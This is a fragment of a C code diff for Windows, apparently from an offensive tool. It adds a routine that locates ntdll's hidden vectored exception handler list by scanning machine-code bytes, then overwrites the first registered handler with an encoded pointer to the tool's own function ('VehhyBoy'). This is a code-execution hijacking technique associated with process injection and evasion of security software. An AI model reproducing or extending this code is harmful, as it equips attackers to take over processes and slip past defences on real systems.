@@ -192,19 +192,54 @@ BOOL InitStuff() {
 	return TRUE;
 }
 
+PVOID VehList() {
+
+	PBYTE   pNext = NULL;
+	PBYTE   pRtlpAddVectoredHandler = NULL;
+	PBYTE   pVehList = NULL;
+	int             offset = 0;
+	int             i = 1;
+
+	PBYTE pRtlAddVectoredExceptionHandler = (PBYTE)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "RtlAddVectoredExceptionHandler");
+
+	if (!pRtlAddVectoredExceptionHandler)
+		return NULL;
+
+	pRtlpAddVectoredHandler = (ULONG_PTR)pRtlAddVectoredExceptionHandler + 0x10;
+
+	while (TRUE) {
+
+		if ((*pRtlpAddVectoredHandler == 0x48) && (*(pRtlpAddVectoredHandler + 1) == 0x8d) && (*(pRtlpAddVectoredHandler + 2) == 0x0d)) {
+
+			if (i == 2) {
+				offset = *(int*)(pRtlpAddVectoredHandler + 3);
+				pNext = (ULONG_PTR)pRtlpAddVectoredHandler + 7;
+				pVehList = pNext + offset;
+				return pVehList;
+			}
+			else {
+				i++;
+			}
+		}
+
+		pRtlpAddVectoredHandler++;
+	}
+
+	return NULL;
+}
+
 BOOL OverWrite(PVOID* pVehPointerLocation) {
 
 	VECTORED_HANDLER_LIST	handler_list = { 0 };
 	VEH_HANDLER_ENTRY		handler_entry = { 0 };
-	ULONG_PTR				veh_list_win10 = g_PeStuff.uNtdll + VEH_LIST_OFFSET_WIN10;
+	PVOID				pVehList = VehList();
 
-	if (!_memcpy(&handler_list, veh_list_win10, sizeof(handler_list)))
+	if (!_memcpy(&handler_list, pVehList, sizeof(handler_list)))
 		return FALSE;
 
 	if (!_memcpy(&handler_entry, handler_list.FirstExceptionHandler, sizeof(handler_entry)))
 		return FALSE;
 
-	//EncodePointer can be replaced with a syscall and some shitty encoding function
 	handler_entry.VectoredHandler1 = EncodePointer(&VehhyBoy);
 
 	ULONG_PTR pointer_offset = (ULONG_PTR)handler_list.FirstExceptionHandler + offsetof(VEH_HANDLER_ENTRY, VectoredHandler1);
